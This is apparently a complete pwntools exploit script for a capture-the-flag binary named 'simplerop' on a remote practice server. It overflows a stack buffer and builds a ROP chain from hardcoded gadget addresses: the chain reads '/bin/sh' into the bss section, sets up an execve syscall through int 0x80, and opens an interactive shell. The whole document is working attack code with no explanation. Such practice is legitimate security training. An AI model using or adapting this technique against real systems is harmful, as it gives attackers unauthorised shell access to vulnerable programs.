from pwn import *

io = remote("node4.buuoj.cn", 27372)

elf = ELF("./simplerop")

int80 = 0x080493e1
pop_eax = 0x80bae06
read_addr = 0x0806CD50
bss = 0x080EB584
pop_edx_ecx_ebx = 0x0806e850

payload = b'M'*(0x1c+4) + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(0) + p32(bss) + p32(0x8)
payload += p32(pop_eax) + p32(0xb)
payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(bss) + p32(int80)

# io.recvuntil("Your input :")
io.sendline(payload)
io.sendline('/bin/sh\x00')


io.interactive()